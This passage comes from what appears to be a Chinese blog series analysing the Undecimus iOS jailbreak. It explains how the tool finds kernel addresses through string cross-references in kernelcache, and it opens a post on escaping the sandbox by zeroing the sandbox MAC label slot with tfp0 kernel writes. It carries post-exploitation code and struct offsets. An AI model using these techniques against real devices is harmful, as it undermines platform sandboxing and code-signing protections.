<span class="keyword">unsigned</span> <span class="keyword">char</span>* needle,   <span class="keyword">size_t</span> nlen)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> last, scan = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> bad_char_skip[UCHAR_MAX + <span class="number">1</span>]; <span class="comment">/* Officially called:</span></span><br><span class="line"><span class="comment">                                          * bad character shift */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Sanity checks on the parameters */</span></span><br><span class="line">    <span class="keyword">if</span> (nlen &lt;= <span class="number">0</span> || !haystack || !needle)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ---- Preprocess ---- */</span></span><br><span class="line">    <span class="comment">/* Initialize the table to default value */</span></span><br><span class="line">    <span class="comment">/* When a character is encountered that does not occur</span></span><br><span class="line"><span class="comment">     * in the needle, we can safely skip ahead for the whole</span></span><br><span class="line"><span class="comment">     * length of the needle.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (scan = <span class="number">0</span>; scan &lt;= UCHAR_MAX; scan = scan + <span class="number">1</span>)</span><br><span class="line">        bad_char_skip[scan] = nlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C arrays have the first byte at [0], therefore:</span></span><br><span class="line"><span class="comment">     * [nlen - 1] is the last byte of the array. */</span></span><br><span class="line">    last = nlen - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Then populate it with the analysis of the needle */</span></span><br><span class="line">    <span class="keyword">for</span> (scan = <span class="number">0</span>; scan &lt; last; scan = scan + <span class="number">1</span>)</span><br><span class="line">        bad_char_skip[needle[scan]] = last - scan;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ---- Do the matching ---- */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search the haystack, while the needle can still be within it. */</span></span><br><span class="line">    <span class="keyword">while</span> (hlen &gt;= nlen)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* scan from the end of the needle */</span></span><br><span class="line">        <span class="keyword">for</span> (scan = last; haystack[scan] == needle[scan]; scan = scan - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> (scan == <span class="number">0</span>) <span class="comment">/* If the first byte matches, we've found it. */</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">void</span> *)haystack;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* otherwise, we need to skip some bytes and start again.</span></span><br><span class="line"><span class="comment">           Note that here we are getting the skip value based on the last byte</span></span><br><span class="line"><span class="comment">           of needle, no matter where we didn't match. So if needle is: "abcd"</span></span><br><span class="line"><span class="comment">           then we are skipping based on 'd' and that value will be 4, and</span></span><br><span class="line"><span class="comment">           for "abcdd" we again skip on 'd' but the value will be only 1.</span></span><br><span class="line"><span class="comment">           The alternative of pretending that the mismatched character was</span></span><br><span class="line"><span class="comment">           the last character is slower in the normal case (E.g. finding</span></span><br><span class="line"><span class="comment">           "abcd" in "...azcd..." gives 4 by using 'd' but only</span></span><br><span class="line"><span class="comment">           4-2==2 using 'z'. */</span></span><br><span class="line">        hlen     -= bad_char_skip[haystack[last]];</span><br><span class="line">        haystack += bad_char_skip[haystack[last]];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们首先根据调用分析入参：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">addr_t</span> base = cstring_base;</span><br><span class="line"><span class="keyword">addr_t</span> off = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((str = boyermoore_horspool_memmem(kernel + base + off, <span class="built_in">size</span> - off, (<span class="keyword">uint8_t</span> *)<span class="built_in">string</span>, <span class="built_in">strlen</span>(<span class="built_in">string</span>)))) &#123;</span><br><span class="line">    <span class="comment">// Only match the beginning of strings</span></span><br><span class="line">    <span class="comment">// first_string || \0this_string</span></span><br><span class="line">    <span class="keyword">if</span> ((str == kernel + base || *(str<span class="number">-1</span>) == <span class="string">'\0'</span>) &amp;&amp; (!full_match || <span class="built_in">strcmp</span>((<span class="keyword">char</span> *)str, <span class="built_in">string</span>) == <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// find after str</span></span><br><span class="line">    off = str - (kernel + base) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>haystack = kernel + base + off，即 <code>__TEXT,__cstring</code> 段的起始地址；</li>
<li>hlen = size - off，即 <code>__TEXT,__cstring</code> 段的长度；</li>
<li>needle = string 即待查找字符串指针；</li>
<li>nlen = strlen(string) 即待查找字符串的长度。</li>
</ol>
<p>在函数的开头首先维护了一个 <code>bad_char_skip</code> 数组来记录当匹配失败时，应当跳过多少个字符来避免无意义的匹配。整个算法采用了倒序扫描的方式，不断从 <code>haystack[needle_len - 1]</code> 向前扫描并检查 <code>haystack[i] == needle[i]</code>，当匹配到 <code>haystack[0]</code> 时如果依然满足条件，说明找到了字符串的地址，否则根据匹配失败的字符查 <code>bad_char_skip</code> 表将 haystack 指针后移继续匹配。</p>
<p><strong>需要注意的是，在匹配成功后得到的字符串地址是相对于用户空间的 kernelcache 映射 <code>kernel</code> 的，并非是字符串在内核中的实际地址。</strong></p>
<h2 id="搜索对字符串所在地址的寻址操作"><a href="#搜索对字符串所在地址的寻址操作" class="headerlink" title="搜索对字符串所在地址的寻址操作"></a>搜索对字符串所在地址的寻址操作</h2><p>在获取到字符串在用户空间的地址 <code>str</code> 后，首先需要计算它在 kernelcache 中的虚拟地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">addr_t</span> str_vmaddr = str - kernel + kerndumpbase;</span><br></pre></td></tr></table></figure>

<p>内核代码中对 str 的引用一定涉及到对 <code>str_vmaddr</code> 的寻址，主要的寻址方式有以下几种：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 1</span></span><br><span class="line"><span class="keyword">adrp </span>xn, <span class="keyword">str@PAGE</span></span><br><span class="line"><span class="keyword">add </span>xn, xn, <span class="keyword">str@PAGEOFF</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">; </span><span class="number">2</span></span><br><span class="line"><span class="keyword">ldr </span>xn, [xm, <span class="symbol">#imm</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">; 3</span></span><br><span class="line"><span class="keyword">ldr </span>xn, =<span class="symbol">#imm</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 4</span></span><br><span class="line"><span class="keyword">adr </span>xn, <span class="symbol">#imm</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 5</span></span><br><span class="line"><span class="keyword">bl </span><span class="symbol">#addr</span></span><br></pre></td></tr></table></figure>

<p>在 <code>find_strref</code> 的尾部调用了 <code>return find_reference(str_vmaddr, n, text_base)</code>，<code>find_reference</code> 对 <code>__TEXT_EXEC,__text</code> 进行了静态分析，对寻址相关的指令模拟了寄存器运算，主要逻辑在 <code>xref64</code> 函数中，当发现寄存器中的值等于 <code>str_vmaddr</code> 时即找到了一条对 str 的交叉引用。</p>
<p>这里的代码主要是对机器码的解码和运算操作，篇幅较长不再贴出，读者有兴趣可以自行阅读。</p>
<h1 id="通过-String-XREF-定位变量地址"><a href="#通过-String-XREF-定位变量地址" class="headerlink" title="通过 String XREF 定位变量地址"></a>通过 String XREF 定位变量地址</h1><p>上文中我们已经得到了目标函数 <code>proc_apply_resource_actions</code> 中对 str 的引用地址，随后需要向上回溯定位 <code>task_suspend</code> 函数的调用指令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">addr_t</span> <span class="title">find_kernel_task</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">             adrp x8,     str@PAGE</span></span><br><span class="line"><span class="comment">     str --&gt; add  x8, x8, str@PAGEOFF</span></span><br><span class="line"><span class="comment">             bl   _panic</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">addr_t</span> str = find_strref(<span class="string">"\"shouldn't be applying exception notification"</span>, <span class="number">2</span>, string_base_cstring, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    str -= kerndumpbase;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find bl _task_suspend</span></span><br><span class="line">    <span class="keyword">addr_t</span> call = step64_back(kernel, str, <span class="number">0x10</span>, INSN_CALL);</span><br><span class="line">    <span class="keyword">if</span> (!call) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">addr_t</span> task_suspend = follow_call64(kernel, call);</span><br><span class="line">    <span class="keyword">if</span> (!task_suspend) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">addr_t</span> adrp = step64(kernel, task_suspend, <span class="number">20</span>*<span class="number">4</span>, INSN_ADRP);</span><br><span class="line">    <span class="keyword">if</span> (!adrp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">addr_t</span> kern_task = calc64(kernel, adrp, adrp + <span class="number">0x8</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kern_task) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kern_task + kerndumpbase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个过程主要分 3 步：</p>
<ol>
<li>回溯找到 <code>bl _task_suspend</code> 的调用点，解出 <code>task_suspend</code> 函数的地址；</li>
<li>从 <code>task_suspend</code> 函数向后搜寻第一条 adrp 指令，即是对 Kernel Task 的寻址；</li>
<li>从寻址指令中解出 Kernel Task 地址。</li>
</ol>
<p>我们再回过头来看 <code>proc_apply_resource_actions</code> 函数片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(action) &#123;</span><br><span class="line">	<span class="keyword">case</span> PROC_POLICY_RSRCACT_THROTTLE:</span><br><span class="line">		<span class="comment">/* no need to do anything */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> PROC_POLICY_RSRCACT_SUSPEND:</span><br><span class="line">		task_suspend(p-&gt;task);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> PROC_POLICY_RSRCACT_TERMINATE:</span><br><span class="line">		psignal(p, SIGKILL);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> PROC_POLICY_RSRCACT_NOTIFY_KQ:</span><br><span class="line">		<span class="comment">/* not implemented */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">case</span> PROC_POLICY_RSRCACT_NOTIFY_EXC:</span><br><span class="line">		panic(<span class="string">"shouldn't be applying exception notification to process!"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译时不一定会按照 case 的顺序生成机器码，因此我们需要根据 str XREF 找到 kernelcache 中的实际表示，一个简单地办法是在 <code>find_strref(&quot;\&quot;shouldn&#39;t be applying exception notification&quot;, 2, string_base_cstring, false, false)</code> 后打一个断点来获取 str XREF 的文件偏移，再利用二进制分析工具反汇编 kernelcache 中的这个部分。</p>
<p>通过断点调试可知 str XREF 位于 0x0000000000f9f084，这应该是一条 add 指令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         adrp x8,     str@PAGE</span></span><br><span class="line"><span class="comment"> str --&gt; add  x8, x8, str@PAGEOFF</span></span><br><span class="line"><span class="comment">         bl   _panic</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>在 <code>Mach-O</code> 查看器中打开可以发现，0x0000000000f9f084 确实是一条 add 指令：<br><img src="https://user-gold-cdn.xitu.io/2019/12/29/16f519149c6a5e33?w=818&h=272&f=png&s=57926" alt=""></p>
<p>要定位 <code>task_suspend(p-&gt;task)</code> 有两种方式，其一是 <code>p-&gt;task</code> 是一个基于偏移量的结构体成员寻址有明显特征，第二个是看函数调用前的参数准备。在 0xf9f074 处有一个 +16 的偏移量寻址，显然这是对 <code>p-&gt;task</code> 地址的计算，因此 0xf9f078 处即是 <code>task_suspend(p-&gt;task)</code> 的调用。</p>
<p>所以从 add 指令处向前回溯 3 条指令即可，找到这条 CALL 指令后，即可从中解出 <code>task_suspend</code>的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// find bl _task_suspend</span></span><br><span class="line"><span class="keyword">addr_t</span> call = step64_back(kernel, str, <span class="number">0x10</span>, INSN_CALL);</span><br><span class="line"><span class="keyword">if</span> (!call) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">addr_t</span> task_suspend = follow_call64(kernel, call);</span><br><span class="line"><span class="keyword">if</span> (!task_suspend) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>随后我们从 <code>task_suspend</code> 函数的起始地址开始向后搜寻第一个 adrp 指令即可找到对 Kernel Task 的 adrp 语句，静态分析 adrp &amp; add 即可计算出 Kernel Task 的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">addr_t</span> adrp = step64(kernel, task_suspend, <span class="number">20</span>*<span class="number">4</span>, INSN_ADRP);</span><br><span class="line"><span class="keyword">if</span> (!adrp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">addr_t</span> kern_task = calc64(kernel, adrp, adrp + <span class="number">0x8</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> (!kern_task) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>注意这里我们得到的依然是 fileoff，需要加上 <code>kerndumpbase</code> 得到虚拟地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> kern_task + kerndumpbase;</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是，如果要在内核中读取 Kernel Task，这个地址需要加上 kernel_slide 才可以。计算 kernel_slide 的代码紧跟在 tfp0 之后，读者有兴趣可以自行阅读。</strong></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文详细分析了 Undecimus 中基于 string 的交叉引用在内存中定位代码和变量的技术，通过该技术可以实现内核中变量地址的定位，随后可通过读写实现绕过检测和注入等操作。该技术不仅是完成 Jailbreak 的关键技术，也能给读者带来二进制静态分析的一些启发。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.theiphonewiki.com/wiki/Kernelcache" target="_blank" rel="noopener">The iPhone Wiki: Kernelcache</a></li>
<li><a href="https://github.com/apple/darwin-xnu/tree/xnu-4903.221.2" target="_blank" rel="noopener">Apple: Darwin-XNU</a></li>
<li><a href="https://github.com/pwn20wndstuff/Undecimus" target="_blank" rel="noopener">Github/pwn20wndstuff: Undecimus</a></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/12/15/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Escape-from-Sandbox/">Undecimus 分析（一）Escape from Sandbox</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-15</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/JailBreak/">JailBreak</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Undecimus/">Undecimus</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Sandbox-Escape/">Sandbox Escape</a></span><div class="content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dd918d051882573180a2ba7" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</a></li>
<li><a href="https://juejin.im/post/5de37a236fb9a071b5615dea" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（三）IOSurface Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dec7f2f6fb9a0160c411516" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（四）The tfp0 !</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 Sock Port 系列文章中我们从 0 到 1 的介绍了通过 Socket UAF 拿到 tfp0 的全过程。从这篇文章开始我们将通过分析 <a href="https://github.com/pwn20wndstuff/Undecimus" target="_blank" rel="noopener">Undecimus</a> 介绍从 tfp0 到 jailbreak 的全过程。</p>
<p>单单通过 tfp0 能做的事情只是 kread, kwrite 等基础操作，要实现 rootfs read/write, kexec 等工作还需要非常复杂的步骤，本文将介绍通过 tfp0 逃出沙盒，实现 rootfs 读写的原理和过程。</p>
<h1 id="The-Sandbox"><a href="#The-Sandbox" class="headerlink" title="The Sandbox"></a>The Sandbox</h1><p>在 iOS 中有两个重要的内核扩展，分别是 <code>AppleMobileFileIntegrity.kext</code> 和 <code>Sandbox.kext</code>。</p>
<h2 id="Apple-Mobile-File-Integrity"><a href="#Apple-Mobile-File-Integrity" class="headerlink" title="Apple Mobile File Integrity"></a>Apple Mobile File Integrity</h2><p>根据 The iPhone Wiki 对 AMFI 的定义[1]:</p>
<blockquote>
<p>AppleMobileFileIntegrity(.kext), which can go by its full name com.apple.driver.AppleMobileFileIntegrity, is an iOS kernel extension which serves as the corner stone of iOS’s code entitlements model. It is one of the Sandbox’s (com.apple.security.sandbox) dependencies, along with com.apple.kext.AppleMatch (which, like on OS X, is responsible for parsing the Sandbox language rules).</p>
</blockquote>
<p>即 <code>AMFI.kext</code> 是实现 <code>iOS Code Entitlements</code> 的基础组件，它和 <code>AppleMatch.kext</code>(用于解析 Sandbox DSL) 都是 <code>Sandbox.kext</code> 的依赖。</p>
<p>可能有人对 Entitlements 并不熟悉，它代表着 App 拥有的权限。在正向开发中，如果我们为 App 开启 Capability 就会生成对应的 XML Units 插入到 <code>App.entitlements</code>，某些 Capability 只有特定的证书才能生成合法签名。通过这种手段可以限制 Userland App 的权限，从而保证系统安全。</p>
<p>在运行时，内核扩展会注册 Mac Policy 并 hook 特定的 Mach Calls[1]:</p>
<blockquote>
<p>Affectionately known as AMFI, this kext can be found in the iOS 5.0 iPod 4,1 kernel around 0x805E499C (start) and 0x805E3EE8 (Initialization function). The latter function registers a MAC policy (using the kernel exported mac_policy_register), which is used to hook various system operations and enforce Apple’s tight security policy.</p>
</blockquote>
<p>根据 Wiki，AMFI 会 hook 需要 <code>task_for_pid-allow</code> 权限的 Mach Call[1]:</p>
<blockquote>
<p>This kext recognizes the task_for_pid-allow entitlement (among others) and is responsible for hooking this Mach call, which retrieves the Mach task port associated with a BSD process identifier. Given this port, one can usurp control of the task/PID, reading and writing its memory, debugging, etc. It is therefore enabled only if the binary is digitally signed with a proper entitlement file, specifying task_for_pid-allow.</p>
</blockquote>
<p>即 <code>AMFI.kext</code> 会识别 entitlements 中的 <code>task_for_pid-allow</code>，并 Hook 相关 Mach Call，该 Mach Call 会通过 BSD 进程标识符查询特定进程的任务端口返回给调用者，使得调用者可以篡改进程的 task 或 PID, 甚至进行目标进程内存的读写和调试；而 <code>AMFI.kext</code> 会在调用前检查调用者的二进制是否拥有包含 <code>task_for_pid-allow</code> 的合法签名。</p>
<h2 id="Sandbox-Kext"><a href="#Sandbox-Kext" class="headerlink" title="Sandbox Kext"></a>Sandbox Kext</h2><p>Sandbox 的实现与 <code>AMFI.kext</code> 类似，也是通过 Hook 一系列的 Mach Call 并检查特定的 Policy 来保证访问的合法性。根据 Dionysus Blazakis 的 Paper: The Apple Sandbox 中的描述[2]：</p>
<blockquote>
<p>Once the sandbox is initialized, function calls hooked by the TrustedBSD layer will pass<br>through Sandbox.kext for policy enforcement. Depending on the system call, the extension<br>will consult the list of rules for the current process. Some rules (such as the example given<br>above denying access to files under the /opt/sekret path) will require pattern matching<br>support. Sandbox.kext imports functions from AppleMatch.kext to perform regular expression matching on the system call argument and the policy rule that is being checked.<br>For example, does the file being read match the denied path /opt/sekret/.*? The other<br>small part of the system is the Mach messages used to carry tracing information (such as<br>which operations are being checked) back to userspace for logging.</p>
</blockquote>
<p>上述引用主要包含了 3 个关键点：</p>
<ol>
<li>当 Sandbox 被初始化后，被 TrustedBSD layer 所 Hook 的 Mach Call 会通过 <code>Sandbox.kext</code> 执行权限检查；</li>
<li><code>Sandbox.kext</code> 会通过 <code>AppleMatch.kext</code> 解析规则 DSL，并生成 checklist；</li>
<li>通过 checklist 进行检查，例如被读取的 file path 是否在 denied path 列表中等。</li>
</ol>
<h1 id="Policy-的内核表示"><a href="#Policy-的内核表示" class="headerlink" title="Policy 的内核表示"></a>Policy 的内核表示</h1><p>在进程的 proc 结构中有一个 p_ucred 成员用于存储进程的 Identifier (Process owner’s identity. (PUCL))，它相当于进程的 Passport：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">    LIST_ENTRY(proc) p_list; <span class="comment">/* List of all processes. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * task; <span class="comment">/* corresponding task (static)*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p_pptr</span>;</span> <span class="comment">/* Pointer to parent process.(LL) */</span></span><br><span class="line">    <span class="keyword">pid_t</span> p_ppid;	</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* substructures: */</span></span><br><span class="line">    <span class="keyword">kauth_cred_t</span> p_ucred; <span class="comment">/* Process owner's identity. (PUCL) */</span></span><br></pre></td></tr></table></figure>

<p>PUCL 是一个 ucred 对象：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucred</span> &#123;</span></span><br><span class="line">    TAILQ_ENTRY(ucred) cr_link; <span class="comment">/* never modify this without KAUTH_CRED_HASH_LOCK */</span></span><br><span class="line">    u_long cr_ref; <span class="comment">/* reference count */</span></span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">label</span> *<span class="title">cr_label</span>;</span> <span class="comment">/* MAC label */</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>cr_label</code> 成员指向了存储 MAC Policies 的数据结构 <code>label</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">label</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>	l_flags;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">    	<span class="keyword">void</span>	*l_ptr;</span><br><span class="line">    	<span class="keyword">long</span>	 l_long;</span><br><span class="line">    &#125; l_perpolicy[MAC_MAX_SLOTS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>l_perpolicy</code> 数组记录了 MAC Policy 列表，AMFI 和 Sandbox 的 Policy 都会插入到相应进程的 <code>l_perpolicy</code> 中。</p>
<p>根据 Quarkslab Blogs 中的文章 <a href="https://blog.quarkslab.com/modern-jailbreaks-post-exploitation.html" target="_blank" rel="noopener">Modern Jailbreaks’ Post-Exploitation</a>，AMFI 和 Sandbox 分别插入到了 0 和 1 位置[3]：</p>
<blockquote>
<p>Each l_perpolicy “slot” is used by a particular MACF module, the first one being AMFI and the second one the sandbox. LiberiOS calls ShaiHulud2ProcessAtAddr to put 0 in its second label l_perpolicy[1]. Being the label used by the sandbox (processed in the function sb_evaluate), this move will neutralize it while keeping the label used by AMFI (Apple Mobile File Integrity) l_perpolicy[0] untouched (it’s more precise and prevent useful entitlement loss).</p>
</blockquote>
<p>即每个 <code>l_perpolicy</code> 插槽都被用于特定的 MACF 模块，第一个插槽被用于 AMFI，第二个被用于 Sandbox。LiberiOS 通过调用 <code>ShaiHulud2ProcessAtAddr</code> 在不修改第一个插槽的情况下将第二个插槽的指针置 0 来实现更加精准和稳定的沙盒逃逸。</p>
<h1 id="Escape-Now"><a href="#Escape-Now" class="headerlink" title="Escape Now"></a>Escape Now</h1><p>有了 tfp0 和上面的理论基础，实现沙盒逃逸的路径变得清晰了起来，我们只需要将当前进程的 <code>l_perpolicy[1]</code> 修改为 0，即可逃出沙盒。</p>
<p>首先读取到当前进程的 label，路径为 <code>proc-&gt;p_ucred-&gt;cr_label</code>，随后将索引为 1 的 Policy Slot 置 0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSTRUCT_OFFSET_PROC_UCRED 0xf8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSTRUCT_OFFSET_UCRED_CR_LABEL 0x78</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kptr_t</span> <span class="title">swap_sandbox_for_proc</span><span class="params">(<span class="keyword">kptr_t</span> proc, <span class="keyword">kptr_t</span> sandbox)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">kptr_t</span> ret = KPTR_NULL;</span><br><span class="line">    _assert(KERN_POINTER_VALID(proc));</span><br><span class="line">    <span class="keyword">kptr_t</span> <span class="keyword">const</span> ucred = ReadKernel64(proc + 